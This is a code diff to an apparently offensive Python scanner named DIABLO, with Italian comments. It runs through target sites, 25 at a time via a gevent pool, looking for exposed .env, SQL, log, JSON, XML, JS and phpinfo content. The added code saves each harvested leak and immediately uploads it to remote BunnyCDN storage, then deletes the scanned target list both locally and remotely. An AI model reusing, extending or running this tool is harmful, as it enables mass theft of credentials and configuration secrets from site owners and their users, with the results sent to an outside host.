@@ -12,6 +12,7 @@ import time
 # Gevent monkey patch DEVE essere il primissimo import prima di requests/grequests
 from gevent import monkey
 monkey.patch_all()
+from gevent.pool import Pool
 
 from urllib.parse import urlparse
 from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
@@ -89,6 +90,21 @@ def upload_results_to_bunny():
             remote_path = f"risultati/{rel_path}".replace("\\", "/")
             upload_file_to_bunny(local_path, remote_path)
     print("[BUNNY UPLOAD] Caricamento risultati completato.", flush=True)
+
+def delete_file_from_bunny(remote_path):
+    """Elimina un file dallo storage di Bunny"""
+    headers = {"AccessKey": BUNNY_API_KEY}
+    try:
+        url = f"{BUNNY_STORAGE_URL}/{remote_path}"
+        res = requests.delete(url, headers=headers)
+        if res.status_code == 200:
+            print(f"[BUNNY DELETE] 🗑️ Eliminato con successo da Bunny: {remote_path}", flush=True)
+        else:
+            print(f"[BUNNY DELETE] ❌ Errore eliminazione {remote_path}: Status {res.status_code} - {res.text}", flush=True)
+    except Exception as e:
+        print(f"[BUNNY DELETE] ⚠️ Eccezione durante l'eliminazione di {remote_path}: {str(e)}", flush=True)
+        with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
+            f.write(f"Error deleting from Bunny Storage: {str(e)}\n")
 
 def load_config():
     try:
@@ -307,9 +323,12 @@ def process_urls(urls_list, is_fallback=False):
                         }
                 if r: r.close()
                 
+            site_pool = Pool(25)
+            jobs = []
             for site_link, site_payloads in hosts_by_site.items():
                 print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
-                _scan_site(site_link, site_payloads, is_fallback)
+                jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads, is_fallback))
+            site_pool.join()
                 
         except Exception as e:
             with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
@@ -502,34 +521,56 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                     if not is_html_content:
                         print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
                         rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+                        
+                        saved_file_path = None
+                        remote_subpath = None
+                        
                         if is_json_file:
                             with open(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link}  1\n')
-                            with open(os.path.join(newpathtextract, f'DIABLO_JSON_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_JSON_{rnd_suffix}.txt')
+                            with open(saved_file_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_JSON_{rnd_suffix}.txt"
                         elif is_env_file:
                             with open(myfile_checktmobilephps, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link}  2\n')
-                            with open(os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt')
+                            with open(saved_file_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_NEW_{rnd_suffix}.txt"
                         elif url_lower.endswith('.js'):
                             with open(os.path.join(result_dir, 'DIABLO_JS.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 3\n')
-                            with open(os.path.join(newpathtextract, f'DIABLO_JS_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_JS_{rnd_suffix}.txt')
+                            with open(saved_file_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_JS_{rnd_suffix}.txt"
                         elif url_lower.endswith('.xml'):
                             with open(myfile_checkxml, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 4\n')
-                            with open(os.path.join(newpathtextract, f'DIABLO_XML_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_XML_{rnd_suffix}.txt')
+                            with open(saved_file_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_XML_{rnd_suffix}.txt"
                         elif url_lower.endswith('.log'):
                             with open(os.path.join(result_dir, 'DIABLO_LOG.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 5\n')
-                            with open(os.path.join(newpathtextract, f'DIABLO_LOG_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_LOG_{rnd_suffix}.txt')
+                            with open(saved_file_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_LOG_{rnd_suffix}.txt"
                         elif url_lower.endswith('.sql'):
                             with open(os.path.join(result_dir, 'DIABLO_SQL.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 6\n')
-                            with open(os.path.join(newpathtextract, f'DIABLO_SQL_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_SQL_{rnd_suffix}.txt')
+                            with open(saved_file_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_SQL_{rnd_suffix}.txt"
                         else:
                             with open(os.path.join(result_dir, 'DIABLO_OTHER.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                             with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 7\n')
-                            with open(os.path.join(newpathtextract, f'DIABLO_OTHER_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            saved_file_path = os.path.join(newpathtextract, f'DIABLO_OTHER_{rnd_suffix}.txt')
+                            with open(saved_file_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
+                            remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_OTHER_{rnd_suffix}.txt"
+                            
+                        # Carica in tempo reale il file su Bunny
+                        if saved_file_path and remote_subpath:
+                            upload_file_to_bunny(saved_file_path, remote_subpath)
                             
                     try:
                         html_content = r.text
@@ -554,7 +595,12 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                     rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                                     with open(myfile_checktmobilephp, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                                     with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 8\n')
-                                    with open(os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
+                                    
+                                    saved_php_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt')
+                                    with open(saved_php_path, 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
+                                    
+                                    # Carica in tempo reale il file su Bunny
+                                    upload_file_to_bunny(saved_php_path, f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix_php}.txt")
                     except: pass
                 try: r.close()
                 except: pass
@@ -641,13 +687,26 @@ def process_file(file_path):
                         }
                 if r: r.close()
                 
+            site_pool = Pool(25)
+            jobs = []
             for site_link, site_payloads in hosts_by_site.items():
                 print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
-                _scan_site(site_link, site_payloads)
+                jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads))
+            site_pool.join()
                 
         except Exception as e:
             with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
                 f.write(str(e) + '\n')
+                
+    # Alla fine della scansione di questo file, lo elimino sia in locale che su BunnyCDN
+    print(f"\n[SCANNER] 🏁 Elaborazione terminata per: {file_name}", flush=True)
+    try:
+        os.remove(file_path)
+        print(f"[SYSTEM] File locale eliminato: {file_path}", flush=True)
+    except Exception as e:
+        print(f"[SYSTEM] Errore eliminazione locale {file_path}: {e}", flush=True)
+        
+    delete_file_from_bunny(f"site/{file_name}")
 
 def main():
     print("\n[SYSTEM] 🛡️ Inizializzazione scanner DIABLO...", flush=True)
